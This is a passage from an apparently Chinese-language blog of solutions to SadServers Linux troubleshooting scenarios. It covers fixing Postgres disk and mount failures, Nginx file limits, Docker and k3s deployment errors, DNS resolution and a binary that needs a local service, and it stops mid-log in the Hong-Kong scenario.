/etc/postgresql/14/main/postgresql.conf. In our case Postgres is managed by systemd as a unit with name postgresql. OS: Debian 10 \u6709\u4e00\u4e9b\u96be\u5ea6\uff0c\u770b\u4e86\u4e9b\u63d0\u793a\u3002 \u9996\u5148 systemctl status postgresql \u53ef\u4ee5\u770b\u51fa postgresql \u786e\u5b9e\u5728\u8fd0\u884c\uff0c\u4f46\u662f\u8fde\u4e0d\u4e0a\u3002\u770b\u4e00\u770b /var/log/syslog \u6ca1\u6709\u4ec0\u4e48\u5f02\u6837\u3002 \u8bd5\u7740 systemctl restart postgresql \u91cd\u542f postgresql\uff0c\u6ca1\u6709\u62a5\u9519\uff0c\u4f46\u662f /var/log/syslog \u91cc\u9762\u53ef\u4ee5\u770b\u5230\u9519\u8bef\uff1a Nov 3 09:11:58 ip-172-31-47-134 postgresql@14-main[884]: 2022-11-03 09:11:58.882 UTC [889] FATAL: could not create lock file \"postmaster.pid\": No space left on device No space left on device\uff0c\u6240\u4ee5 df \u770b\u4e00\u4e0b\u78c1\u76d8\u7528\u91cf\uff1a root@ip-172-31-47-134:/# df Filesystem 1K-blocks Used Available Use% Mounted on udev 229200 0 229200 0% /dev tmpfs 47660 1520 46140 4% /run /dev/nvme1n1p1 8026128 1233676 6363196 17% / tmpfs 238300 0 238300 0% /dev/shm tmpfs 5120 0 5120 0% /run/lock tmpfs 238300 0 238300 0% /sys/fs/cgroup /dev/nvme1n1p15 126710 278 126432 1% /boot/efi /dev/nvme0n1 8378368 8378340 28 100% /opt/pgdata \u53ef\u4ee5\u770b\u5230\u6302\u8f7d\u5728 /opt/pgdata \u4e0a\u7684\u8bbe\u5907\u5bb9\u91cf\u6ee1\u4e86\u3002\u68c0\u67e5\u4e00\u4e0b\u8fd9\u4e2a\u76ee\u5f55\uff1a root@ip-172-31-47-134:/# ls -l /opt/pgdata total 8285620 -rw-r--r-- 1 root root 69 May 21 22:20 deleteme -rw-r--r-- 1 root root 7516192768 May 21 22:06 file1.bk -rw-r--r-- 1 root root 967774208 May 21 22:17 file2.bk -rw-r--r-- 1 root root 499712 May 21 22:23 file3.bk drwx------ 19 postgres postgres 4096 May 21 22:24 main \u53ef\u4ee5\u53d1\u73b0\u4e00\u5806 .bk \u5907\u4efd\u6587\u4ef6\u5360\u6ee1\u4e86\u78c1\u76d8\uff0c\u5220\u9664\u3001\u91cd\u542f\u3001\u6d4b\u8bd5\uff0c\u53d1\u73b0\u4e00\u5207\u6b63\u5e38\u4e86\uff1a root@ip-172-31-47-134:/# rm /opt/pgdata/file*.bk root@ip-172-31-47-134:/# ls -l /opt/pgdata total 8 -rw-r--r-- 1 root root 69 May 21 22:20 deleteme drwx------ 19 postgres postgres 4096 May 21 22:24 main root@ip-172-31-47-134:/# systemctl restart postgresql root@ip-172-31-47-134:/# sudo -u postgres psql -c \"insert into persons(name) values ('jane smith');\" -d dt INSERT 0 1 \"Cape Town\" \u00b6 Scenario: \"Cape Town\": Borked Nginx Level: Medium Description: There's an Nginx web server installed and managed by systemd. Running curl -I 127.0.0.1:80 returns curl: (7) Failed to connect to localhost port 80: Connection refused , fix it so when you curl you get the default Nginx page. OS: Debian 11 \u9996\u5148 systemctl status nginx \u68c0\u67e5\u4e00\u4e0b nginx \u8fd0\u884c\u72b6\u6001\uff1a $ sudo systemctl status nginx \u25cf nginx.service - The NGINX HTTP and reverse proxy server Loaded: loaded (/etc/systemd/system/nginx.service; enabled; vendor preset: enabled) Active: failed (Result: exit-code) since Thu 2022-11-03 09:30:47 UTC; 42s ago Process: 584 ExecStartPre=/usr/sbin/nginx -t (code=exited, status=1/FAILURE) CPU: 28ms Nov 03 09:30:47 ip-172-31-33-45 systemd[1]: Starting The NGINX HTTP and reverse proxy server... Nov 03 09:30:47 ip-172-31-33-45 nginx[584]: nginx: [emerg] unexpected \";\" in /etc/nginx/sites-enabled/default:1 Nov 03 09:30:47 ip-172-31-33-45 nginx[584]: nginx: configuration file /etc/nginx/nginx.conf test failed Nov 03 09:30:47 ip-172-31-33-45 systemd[1]: nginx.service: Control process exited, code=exited, status=1/FAILURE Nov 03 09:30:47 ip-172-31-33-45 systemd[1]: nginx.service: Failed with result 'exit-code'. Nov 03 09:30:47 ip-172-31-33-45 systemd[1]: Failed to start The NGINX HTTP and reverse proxy server. \u53d1\u73b0\u6709\u62a5\u9519\uff0c\u8bf4\u5728 /etc/nginx/sites-enabled/default:1 \u6709\u4e00\u4e2a unexpected \";\"\uff0c\u6240\u4ee5\u53bb\u5220\u6389\u5b83\uff0c\u7136\u540e\u91cd\u542f\u3002 admin@ip-172-31-33-45:/$ sudo vim /etc/nginx/sites-enabled/default admin@ip-172-31-33-45:/$ sudo systemctl restart nginx admin@ip-172-31-33-45:/$ sudo systemctl status nginx \u25cf nginx.service - The NGINX HTTP and reverse proxy server Loaded: loaded (/etc/systemd/system/nginx.service; enabled; vendor preset: enabled) Active: active (running) since Thu 2022-11-03 09:32:32 UTC; 6s ago Process: 868 ExecStartPre=/usr/sbin/nginx -t (code=exited, status=0/SUCCESS) Process: 869 ExecStart=/usr/sbin/nginx (code=exited, status=0/SUCCESS) Main PID: 870 (nginx) Tasks: 2 (limit: 524) Memory: 2.4M CPU: 27ms CGroup: /system.slice/nginx.service \u251c\u2500870 nginx: master process /usr/sbin/nginx \u2514\u2500871 nginx: worker process Nov 03 09:32:32 ip-172-31-33-45 systemd[1]: Starting The NGINX HTTP and reverse proxy server... Nov 03 09:32:32 ip-172-31-33-45 nginx[868]: nginx: the configuration file /etc/nginx/nginx.conf syntax is ok Nov 03 09:32:32 ip-172-31-33-45 nginx[868]: nginx: configuration file /etc/nginx/nginx.conf test is successful Nov 03 09:32:32 ip-172-31-33-45 systemd[1]: Started The NGINX HTTP and reverse proxy server. \u5de5\u4f5c\u6b63\u5e38\uff0c\u4f46\u662f curl \u4e00\u4e0b\u4f1a\u5f97\u5230 500\u3002\u68c0\u67e5\u4e00\u4e0b log\uff1a admin@ip-172-31-33-45:/$ cat /var/log/nginx/error.log | tail -n 10 2022/09/11 16:39:11 [emerg] 5875#5875: unexpected \";\" in /etc/nginx/sites-enabled/default:1 2022/09/11 16:54:26 [emerg] 5931#5931: unexpected \";\" in /etc/nginx/sites-enabled/default:1 2022/09/11 16:55:00 [emerg] 5961#5961: unexpected \";\" in /etc/nginx/sites-enabled/default:1 2022/09/11 17:02:07 [emerg] 6066#6066: unexpected \";\" in /etc/nginx/sites-enabled/default:1 2022/09/11 17:07:03 [emerg] 6146#6146: unexpected \";\" in /etc/nginx/sites-enabled/default:1 2022/11/03 09:30:47 [emerg] 584#584: unexpected \";\" in /etc/nginx/sites-enabled/default:1 2022/11/03 09:32:32 [alert] 870#870: socketpair() failed while spawning \"worker process\" (24: Too many open files) 2022/11/03 09:32:32 [emerg] 871#871: eventfd() failed (24: Too many open files) 2022/11/03 09:32:32 [alert] 871#871: socketpair() failed (24: Too many open files) 2022/11/03 09:33:03 [crit] 871#871: *1 open() \"/var/www/html/index.nginx-debian.html\" failed (24: Too many open files), client: 127.0.0.1, server: _, request: \"GET / HTTP/1.1\", host: \"127.0.0.1\" \u53ef\u4ee5\u53d1\u73b0\u62a5\u9519 Too many open files\u3002\u641c\u4e86\u4e00\u4e0b\uff0c\u7f51\u4e0a\u63d0\u4f9b\u7684\u65b9\u6cd5\u90fd\u8bd5\u4e86\u4e00\u5708\uff0c\u95ee\u9898\u4e0d\u51fa\u5728 nginx \u7684\u914d\u7f6e\u4e0a\u3002\u7136\u540e\u6839\u636e\u63d0\u793a\u53bb\u770b\u4e86 systemd \u4e0a nginx \u7684\u914d\u7f6e\uff1a admin@ip-172-31-33-45:/$ cat /etc/systemd/system/nginx.service [Unit] Description=The NGINX HTTP and reverse proxy server After=syslog.target network-online.target remote-fs.target nss-lookup.target Wants=network-online.target [Service] Type=forking PIDFile=/run/nginx.pid ExecStartPre=/usr/sbin/nginx -t ExecStart=/usr/sbin/nginx ExecReload=/usr/sbin/nginx -s reload ExecStop=/bin/kill -s QUIT $MAINPID PrivateTmp=true LimitNOFILE=10 [Install] WantedBy=multi-user.target \u628a LimitNOFILE=10 \u6539\u6210 LimitNOFILE=1024\uff0c\u7136\u540e\u91cd\u542f nginx \u5373\u53ef\u6b63\u5e38\u5f97\u5230\u54cd\u5e94\uff1a admin@ip-172-31-33-45:/$ sudo systemctl restart nginx Warning: The unit file, source configuration file or drop-ins of nginx.service changed on disk. Run 'systemctl daemon-reload' to reload units. admin@ip-172-31-33-45:/$ sudo systemctl daemon-reload admin@ip-172-31-33-45:/$ sudo systemctl restart nginx admin@ip-172-31-33-45:/$ curl -Is 127.0.0.1:80 | head -1 HTTP/1.1 200 OK \"Salta\" \u00b6 Scenario: \"Salta\": Docker container won't start. Level: Medium Description: There's a \"dockerized\" Node.js web application in the /home/admin/app directory. Create a Docker container so you get a web app on port :8888 and can curl to it. For the solution to be valid, there should be only one running Docker container. OS: Debian 11 \u9996\u5148\u68c0\u67e5\u4e00\u4e0b docker \u5bb9\u5668\uff1a admin@ip-172-31-38-21:/$ sudo docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 124a4fb17a1c app \"docker-entrypoint.s\u2026\" 6 weeks ago Exited (1) 6 weeks ago elated_taussig admin@ip-172-31-38-21:~/app$ sudo docker logs 124 node:internal/modules/cjs/loader:928 throw err; ^ Error: Cannot find module '/usr/src/app/serve.js' at Function.Module._resolveFilename (node:internal/modules/cjs/loader:925:15) at Function.Module._load (node:internal/modules/cjs/loader:769:27) at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:76:12) at node:internal/main/run_main_module:17:47 { code: 'MODULE_NOT_FOUND', requireStack: [] } \u53d1\u73b0\u62a5\u9519\u4e86\uff0cDockerfile \u91cc\u51fa\u4e86\u4e00\u4e9b\u95ee\u9898\uff0c\u770b\u4e00\u4e0b\uff1a # documentation https://nodejs.org/en/docs/guides/nodejs-docker-webapp/ # most recent node (security patches) and alpine (minimal, adds to security, possible libc issues) FROM node:15.7-alpine # Create app directory & copy app files WORKDIR /usr/src/app # we copy first package.json only, so we take advantage of cached Docker layers COPY ./package*.json ./ # RUN npm ci --only=production RUN npm install # Copy app source COPY ./* ./ # port used by this app EXPOSE 8880 # command to run CMD [ \"node\" , \"serve.js\" ] \u53d1\u73b0\u6700\u540e CMD \u91cc server.js \u6253\u6210\u4e86 serve.js\uff0c\u800c\u4e14 EXPOSE \u7684\u7aef\u53e3\u4e5f\u4e0d\u5bf9\u3002\u4e24\u4e2a\u95ee\u9898\u4fee\u4e00\u4e0b\u7136\u540e\u91cd\u65b0\u6784\u5efa\u3001\u8fd0\u884c\uff1a admin@ip-172-31-38-21:~/app$ sudo docker build -t app . admin@ip-172-31-38-21:~/app$ sudo docker rm 124 admin@ip-172-31-38-21:~/app$ sudo docker run -d -p 8888:8888 app e67b36ff14ff3676e419036180abf9231e97eacc5ec6fe9d76426e7003acfb8f docker: Error response from daemon: driver failed programming external connectivity on endpoint nifty_bhaskara (ce8a09c7a42f730b89e0bd1bd3298de1598d79bf0d08d1532a7f38002cda84d4): Error starting userland proxy: listen tcp4 0.0.0.0:8888: bind: address already in use. \u53d1\u73b0\u62a5\u9519 8888 \u7aef\u53e3\u88ab\u5360\u7528\u4e86\u3002\u6ca1\u6709 lsof\uff0c\u7528 netstat \u67e5\u4e00\u4e0b\u7aef\u53e3\uff1a admin@ip-172-31-38-21:~/app$ netstat -tunlp (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:8888 0.0.0.0:* LISTEN - tcp6 0 0 :::8080 :::* LISTEN 562/gotty tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::8888 :::* LISTEN - tcp6 0 0 :::6767 :::* LISTEN 563/sadagent udp 0 0 127.0.0.1:323 0.0.0.0:* - udp 0 0 0.0.0.0:68 0.0.0.0:* - udp6 0 0 fe80::8d3:45ff:fee9:546 :::* - udp6 0 0 ::1:323 :::* - \u53d1\u73b0 8888 \u7aef\u53e3\u5728\u7528\uff0cps -aux \u53ef\u4ee5\u770b\u5230\u6709\u4e00\u4e2a nginx \u5728\u8fd0\u884c\uff0c\u5728 /etc/nginx/sites-enabled/default \u91cc\u786e\u5b9e\u6709\u4f7f\u7528 8888 \u7aef\u53e3\u3002 \u6240\u4ee5\u5148\u505c\u6389 nginx\uff0c\u7136\u540e\u91cd\u65b0\u90e8\u7f72\u5bb9\u5668\u5373\u53ef\uff1a admin@ip-172-31-38-21:~/app$ sudo systemctl stop nginx admin@ip-172-31-38-21:~/app$ sudo docker stop e6 e6 admin@ip-172-31-38-21:~/app$ sudo docker rm e6 e6 admin@ip-172-31-38-21:~/app$ sudo docker run -d -p 8888:8888 app ... admin@ip-172-31-38-21:~/app$ curl localhost:8888 Hello World! \"Jakarta\" \u00b6 Scenario: \"Jakarta\": it's always DNS. Level: Hard Description: Can't ping google.com. It returns ping: google.com: Name or service not known. Expected is being able to resolve the hostname. (Note: currently the VMs can't ping outside so there's no automated check for the solution). OS: Ubuntu 22.04 LTS \u6839\u636e\u9898\u76ee\u77e5\u9053\u662f dns \u51fa\u4e86\u95ee\u9898\uff0c/etc/resolv.conf \u91cc\u7684\u914d\u7f6e\u90fd\u6ca1\u5565\u95ee\u9898\u3002\u800c\u4e14\u6574\u4e2a sadservers \u662f\u4e0d\u80fd\u8fde\u63a5\u5916\u7f51\u7684\uff0c\u6240\u4ee5\u5927\u6982\u53ea\u80fd\u7528\u672c\u673a\u7684\u4e86\u3002\u641c\u7d22\u4e86\u4e00\u4e0b dns \u76f8\u5173\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u770b\u4e86\u4e00\u5708\u53d1\u73b0 /etc/nsswitch.conf \u91cc\u7684 hosts \u914d\u7f6e\u6709\u95ee\u9898\uff1a hosts: files \u800c\u7f51\u4e0a\u7684\u4f8b\u5b50\u91cc\u90fd\u6709 dns\uff0c\u6240\u4ee5\u5728 files \u540e\u9762\u52a0\u4e00\u4e2a dns \u5c31\u53ef\u4ee5\u4e86\uff1a ubuntu@ip-172-31-42-233:/$ ping google.com PING google.com (142.250.191.174) 56(84) bytes of data. \"Bern\" \u00b6 Scenario: \"Bern\": Docker web container can't connect to db container. Level: Hard Description: There are two Docker containers running, a web application (Wordpress or WP) and a database (MariaDB) as back-end, but if we look at the web page, we see that it cannot connect to the database. curl -s localhost:80 |tail -4 returns: < body id = \"error-page\" > < div class = \"wp-die-message\" >< h1 > Error establishing a database connection </ h1 ></ div ></ body > </ html > This is not a Wordpress code issue (the image is :latest with some network utilities added). What you need to know is that WP uses \"WORDPRESS_DB_\" environment variables to create the MySQL connection string. See the ./html/wp-config.php WP config file for example (from /home/admin). OS: Debian 11 docker ps -a \u53ef\u4ee5\u770b\u5230\u6709\u4e24\u4e2a\u5bb9\u5668\u5728\u8fd0\u884c\u3002\u6839\u636e\u9898\u76ee\u7684 test \u53ef\u4ee5\u77e5\u9053 mysql \u7684\u8d26\u53f7\u5bc6\u7801\u662f root:password\u3002 WordPress \u542f\u52a8\u4f1a\u4ece\u73af\u5883\u53d8\u91cf\u8bfb\u53d6\u914d\u7f6e\uff0c\u6240\u4ee5\u5728 wordpress \u7684\u5bb9\u5668\u4e2d\u67e5\u4e00\u4e0b env\uff1a admin@ip-172-31-19-232:/$ sudo docker exec wordpress env |grep WORDPRESS_DB_ WORDPRESS_DB_PASSWORD=password WORDPRESS_DB_USER=root \u53ef\u4ee5\u770b\u51fa\u7528\u6237\u540d\u548c\u5bc6\u7801\u8bbe\u7f6e\u7684\u662f\u6b63\u786e\u7684\u3002\u4f46\u662f NAME \u548c HOST \u4f7f\u7528\u7684\u5c31\u662f wp-config.php \u4e2d\u9ed8\u8ba4\u7684\u4e86\uff0c\u4e5f\u5c31\u662f wordpress \u548c mysql\uff0cNAME \u7684\u8bdd\u5728 mariadb \u5bb9\u5668\u91cc\u53ef\u4ee5\u770b\u5230\u786e\u5b9e\u662f wordpress\uff0c\u4f46 HOST \u662f mysql\uff0c\u5c31\u8fde\u63a5\u4e0d\u5230\u4e86\u3002 \u800c\u9898\u7ed9\u7684 test \u4e00\u5b9a\u8981\u5728 wordpress \u5bb9\u5668\u91cc\u6253\u5f00 mysqladmin\uff0c\u8fde\u63a5 host mysql\u3002\u4e0d\u77e5\u9053\u600e\u4e48\u641e qwq\uff0chint \u6ca1\u518d\u63a5\u7740\u5199\u4e86\uff0c\u516b\u4f1a qwq\u3002 \"Singara\" \u00b6 Scenario: \"Singara\": Docker and Kubernetes web app not working. Level: Hard Description: There's a k3s Kubernetes install you can access with kubectl. The Kubernetes YAML manifests under /home/admin have been applied. The objective is to access from the host the \"webapp\" web server deployed and find what message it serves (it's a name of a town or city btw). In order to pass the check, the webapp Docker container should not be run separately outside Kubernetes as a shortcut. OS: Debian 11 \u5148\u770b\u4e00\u4e0b k3s \u7684\u914d\u7f6e\u6587\u4ef6\uff1a \u914d\u7f6e\u6587\u4ef6 deployment.yml apiVersion : apps/v1 kind : Deployment metadata : name : webapp-deployment namespace : web spec : selector : matchLabels : app : webapp replicas : 1 template : metadata : labels : app : webapp spec : containers : - name : webapp image : webapp imagePullPolicy : Always ports : - containerPort : 8880 namespace.yml apiVersion : v1 kind : Namespace metadata : name : web nodeport.yml apiVersion : v1 kind : Service metadata : name : webapp-service namespace : web spec : type : NodePort selector : app.kubernetes.io/name : webapp ports : - port : 80 targetPort : 8888 nodePort : 30007 \u7136\u540e\u68c0\u67e5\u4e00\u4e0b k3s \u5404\u90e8\u5206\u7684\u72b6\u6001\uff1a admin@ip-10-0-0-64:~$ kubectl get all -n web NAME READY STATUS RESTARTS AGE pod/webapp-deployment-666b67994b-5sffz 0/1 ImagePullBackOff 0 46d NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/webapp-service NodePort 10.43.35.97 <none> 80:30007/TCP 46d NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/webapp-deployment 0/1 1 0 46d NAME DESIRED CURRENT READY AGE replicaset.apps/webapp-deployment-666b67994b 1 1 0 46d \u53ef\u4ee5\u53d1\u73b0 webapp-deployment \u7684\u955c\u50cf\u62c9\u53d6\u5931\u8d25\u4e86\u3002\u56e0\u4e3a\u5b83\u4f1a\u4ece\u7f51\u7edc\u62c9\u53d6 webapp \u955c\u50cf\u800c\u4e0d\u662f\u672c\u5730\uff0c\u800c\u6574\u4e2a sadservers \u4e0d\u80fd\u8fde\u63a5\u5916\u90e8\u7f51\u7edc\uff0c\u6240\u4ee5\u81ea\u7136\u4f1a\u62c9\u53d6\u5931\u8d25\u3002 \u8fd9\u4e2a\u72b6\u6001\u548c\u524d\u4e00\u9635\u529e ZJUCTF \u6821\u8d5b\u5f88\u50cf\uff0c\u5927\u6982\u5c31\u662f k3s \u62c9\u53d6\u955c\u50cf\u7684\u95ee\u9898\u3002\u5f53\u65f6\u662f\u81ea\u5efa\u4e86\u4e00\u4e2a registry \u6765\u641e\u7684\u3002\u6240\u4ee5\u67e5\u4e00\u4e0b\u672c\u5730\u7684\u955c\u50cf\uff1a admin@ip-10-0-0-64:~$ sudo docker images REPOSITORY TAG IMAGE ID CREATED SIZE webapp latest 9c082e2983bc 6 weeks ago 135MB python 3.7-slim c1d0bab51bbf 7 weeks ago 123MB registry 2 3a0f7b0a13ef 2 months ago 24.1MB \u53d1\u73b0\u6b63\u597d\u6709 registry \u955c\u50cf\u3002\u6240\u4ee5\u672c\u5730\u8d77\u4e00\u4e2a registry \u7136\u540e\u5c06 webapp \u4e0a\u4f20\uff1a admin@ip-10-0-0-64:~$ sudo docker run -d -p 5000:5000 registry:2 ... admin@ip-10-0-0-64:~$ sudo docker tag webapp localhost:5000/webapp admin@ip-10-0-0-64:~$ sudo docker push localhost:5000/webapp Using default tag: latest The push refers to repository [localhost:5000/webapp] ... \u7136\u540e\u6539\u4e00\u4e0b deployment.yml\uff1a ... template : metadata : labels : app : webapp spec : containers : - name : webapp image : localhost:5000/webapp # \u8fd9\u91cc imagePullPolicy : Always ports : - containerPort : 8888 # \u548c\u8fd9\u91cc \u7136\u540e\u5e94\u7528\uff1a admin@ip-10-0-0-64:~$ kubectl apply -f deployment.yml deployment.apps/webapp-deployment configured admin@ip-10-0-0-64:~$ kubectl get pods -n web NAME READY STATUS RESTARTS AGE webapp-deployment-666b67994b-5sffz 0/1 Terminating 0 46d webapp-deployment-8f869f757-g2m7n 1/1 Running 0 12s \u53ef\u4ee5\u53d1\u73b0\u6210\u529f\u542f\u52a8\u4e86\uff0c\u63a5\u4e0b\u6765\u7684\u5c31\u662f\u5c06\u5176\u4e2d\u7684 8888 \u7aef\u53e3\u8f6c\u53d1\u51fa\u6765\uff1a admin@ip-10-0-0-64:~$ kubectl port-forward deployments/webapp-deployment 8888 -n web & Forwarding from 127.0.0.1:8888 -> 8888 Forwarding from [::1]:8888 -> 8888 ... \u7136\u540e\u5728\u53e6\u4e00\u4e2a\u7ec8\u7aef\u91cc curl localhost:8888 \u5c31\u53ef\u4ee5\u5f97\u5230\u6b63\u5e38\u7ed3\u679c\u4e86\u3002 \"Karakorum\" \u00b6 Scenario: \"Karakorum\": WTFIT \u2013 What The Fun Is This? Level: Hard Description: There's a binary at /home/admin/wtfit that nobody knows how it works or what it does (\"what the fun is this\"). Someone remembers something about wtfit needing to communicate to a service in order to start. Run this wtfit program so it doesn't exit with an error, fixing or working around things that you need but are broken in this server. (Note that you can open more than one web \"terminal\"). OS: Debian 11 ls -l \u53ef\u4ee5\u770b\u51fa\u6765 wtfit \u6ca1\u6709\u8fd0\u884c\u6743\u9650\u3002\u6240\u4ee5\u5148 chmod\uff0c\u4f46 chmod \u4f1a\u62a5\u9519 bash: /usr/bin/chmod: Permission denied\u3002\u7ecf\u8fc7\u68c0\u67e5\u53ef\u4ee5\u53d1\u73b0\u662f /usr/bin/chmod \u81ea\u8eab\u4e5f\u6ca1\u6709\u8fd0\u884c\u6743\u9650\uff1a admin@ip-172-31-46-91:/$ ls -l /usr/bin/chmod -rw-r--r-- 1 root root 64448 Sep 24 2020 /usr/bin/chmod \u53ef\u4ee5\u641c\u7d22\u5230 \u4e00\u4e9b\u89e3\u51b3\u529e\u6cd5 \uff1a admin@ip-172-31-46-91:/$ sudo su root@ip-172-31-46-91:/# /lib64/ld-linux-x86-64.so.2 /bin/chmod 755 /bin/chmod root@ip-172-31-46-91:/# cd /home/admin/ root@ip-172-31-46-91:/home/admin# chmod +x wtfit \u8fd0\u884c wtfit \u51fa\u9519\uff1aERROR: can't open config file\u3002\u6839\u636e\u63d0\u793a\u901a\u8fc7 strace \u6765\u8ddf\u8e2a\u5f97\u5230\u9519\u8bef\u7684\u8be6\u7ec6\u6d88\u606f\uff1a admin@ip-172-31-46-91:~$ strace ./wtfit ... openat(AT_FDCWD, \"/home/admin/wtfitconfig.conf\", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) ... \u5728\u8fd9\u4e2a\u4f4d\u7f6e\u521b\u5efa\u4e00\u4e2a\u7a7a\u7684\u914d\u7f6e\u6587\u4ef6\u3002\u7136\u540e\u518d\u8fd0\u884c\uff0c\u8fd8\u662f\u51fa\u9519\uff1aERROR: can't connect to server\u3002\u540c\u6837 strace \u53ef\u4ee5\u5f97\u5230\uff1a admin@ip-172-31-46-91:~$ strace ./wtfit ... connect(3, {sa_family=AF_INET, sin_port=htons(7777), sin_addr=inet_addr(\"127.0.0.1\")}, 16) = -1 EINPROGRESS (Operation now in progress) ... \u6240\u4ee5\u53ef\u4ee5\u770b\u51fa\u5b83\u5728\u8bd5\u56fe\u8fde\u63a5 localhost:7777\u3002\u5f00\u4e00\u4e2a\u65b0\u7684 terminal \u7136\u540e\u76d1\u542c\u4e00\u4e0b 7777 \u7aef\u53e3\uff0c\u8fd0\u884c wtfit\uff1a admin@ip-172-31-46-91:/$ nc -lvvp 7777 Listening on 0.0.0.0 7777 Connection received on localhost 54756 GET / HTTP/1.1 Host: localhost:7777 User-Agent: Go-http-client/1.1 Accept-Encoding: gzip \u53ef\u4ee5\u53d1\u73b0\u5c31\u662f\u7b80\u5355\u7684 GET\uff0c\u6240\u4ee5 python \u8d77\u4e00\u4e2a http server\uff0c\u7136\u540e\u8fd0\u884c\uff1a admin@ip-172-31-46-91:/$ python3 -m http.server 7777 Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ... 127.0.0.1 - - [03/Nov/2022 12:58:30] \"GET / HTTP/1.1\" 200 - \u8fd9\u65f6 wtfit \u5c31\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u7ed3\u675f\u4e86\u3002 \"Hong-Kong\" \u00b6 Scenario: \"Hong-Kong\": can't write data into database. Level: Hard Description: (Similar to \"Manhattan\" scenario but harder). Your objective is to be able to insert a row in an existing Postgres database. The issue is not specific to Postgres and you don't need to know details about it (although it may help). Postgres information: it's a service that listens to a port (:5432) and writes to disk in a data directory, the location of which is defined in the data_directory parameter of the configuration file /etc/postgresql/14/main/postgresql.conf. In our case Postgres is managed by systemd as a unit with name postgresql. OS: Debian 10 \u548c\u524d\u9762\u7684 \"Manhattan\" \u7c7b\u4f3c\u3002\u8fd8\u662f\u5148\u68c0\u67e5\u72b6\u6001\u6ca1\u5f02\u5e38\uff0c\u91cd\u542f\u6ca1\u5f02\u5e38\uff0c\u67e5\u770b /var/log/syslog\uff0c\u53d1\u73b0\uff1a Nov 3 11:52:20 ip-172-31-25-11 systemd[1]: Starting PostgreSQL Cluster 14-main... Nov 3 11:52:20 ip-172-31-25-11 postgresql@14-main[1318]: Error: /opt/pgdata/main is not accessible or does not exist Nov 3 11:52:20 ip-172-31-25-11 systemd[1]: postgresql@14-main.service: Can't open PID file /run/postgresql/14-main.pid (yet?) after start: No such file or directory Nov 3 11:52:20 ip-172-31-25-11 systemd[1]: postgresql@14-main.service: Failed with result 'protocol'. Nov 3 11:52:20 ip-172-31-25-11 systemd[1]: Failed to start PostgreSQL Cluster 14-main. \u627e\u4e0d\u5230 /opt/pgdata/main\uff0cls \u4e00\u4e0b /opt/pgdata \u4e5f\u6ca1\u6709\u3002\u518d\u5f80\u524d\u770b syslog \u53ef\u4ee5\u53d1\u73b0\uff1a Nov 3 11:47:54 ip-172-31-25-11 systemd[1]: dev-xvdb.device: Job dev-xvdb.device/start timed out. Nov 3 11:47:54 ip-172-31-25-11 systemd[1]: Timed out waiting for device /dev/xvdb. Nov 3 11:47:54 ip-172-31-25-11 systemd[1]: Dependency failed for /opt/pgdata. Nov 3 11:47:54 ip-172-31-25-11 systemd[1]: opt-pgdata.mount: Job opt-pgdata.mount/start failed with result 'dependency'. Nov 3 11:47:54 ip-172-31-25-11 systemd[1]: Startup finished in 2.669s (kernel) + 1min 31.106s (userspace) = 1min 33.776s. Nov 3 11:47:54 ip-172-31-25-11 systemd[1]: dev-xvdb.device: Job dev-xvdb.device/start failed with result 'timeout'. \u53ef\u4ee5\u53d1\u73b0\u6302\u8f7d\u8bbe\u5907\u8d85\u65f6\u4e86\u3002 fdisk \u770b\u4e00\u4e0b\uff1a root@ip-172-31-25-11:/# fdisk -l Disk /dev/nvme0n1: 8 GiB, 8589934592 bytes, 16777216 sectors Disk model: Amazon Elastic Block Store Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/nvme1n1: 8 GiB, 8589934592 bytes, 16777216 sectors Disk model: Amazon Elastic Block Store Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: gpt Disk identifier: 56507B41-5D22-1349-81AD-C628BA074922 Device Start End Sectors Size Type /dev/nvme1n1p1 262144 16777182 16515039 7.9G Linux filesystem /dev/nvme1n1p14 2048 8191 6144 3M BIOS boot /dev/nvme1n1p15 8192 262143 253952 124M EFI System Partition table entries are not in disk order. root@ip-172-31-25-11:/# df Filesystem 1K-blocks Used Available Use% Mounted on udev 228728 0 228728 0% /dev tmpfs 47568 1524 46044 4% /run /dev/nvme1n1p1 8026128 1230452 6366420 17% / tmpfs 237828 0 237828 0% /dev/shm tmpfs 5120 0 5120 0% /run/lock tmpfs 237828 0 237828 0% /sys/fs/cgroup /dev/nvme1n1p15 126710 278 126432 1% /boot/efi \u53ef\u4ee5\u53d1\u73b0 /dev/nvme0n1 \u6ca1\u6709\u6302\u8f7d\u4e0a\uff0c\u6839\u636e\u524d\u9762\u9898\u76ee\u53ef\u4ee5\u63a8\u6d4b\u8fd9\u4e2a\u8bbe\u5907\u91cc\u9762\u662f /opt/pgdata \u7684\u5185\u5bb9\u3002 mount /dev/nvme0n1 /opt/pgdata \u5c1d\u8bd5\u6302\u8f7d\uff0c\u6ca1\u6709\u62a5\u9519\uff0c\u4f46\u4ecd\u65e7\u6ca1\u6709\u4e1c\u897f\u3002\u770b\u4e00\u4e0b /var/log/syslog \u53d1\u73b0\uff1a Nov 3 12:02:06 ip-172-31-25-11 kernel: [ 945.914667] SGI XFS with ACLs, security attributes, realtime, no debug enabled Nov 3 12:02:06 ip-172-31-25-11 kernel: [ 945.925395] XFS (nvme0n1): Mounting V5 Filesystem Nov 3 12:02:07 ip-172-31-25-11 kernel: [ 946.092049] XFS (nvme0n1): Ending clean mount Nov 3 12:02:07 ip-172-31-25-11 systemd[1]: opt-pgdata.mount: Unit is bound to inactive unit dev-xvdb.device. Stopping, too. Nov 3 12:02:07 ip-172-31-25-11 systemd[1]: Unmounting /opt/pgdata... Nov 3 12:02:07 ip-172-31-25-11 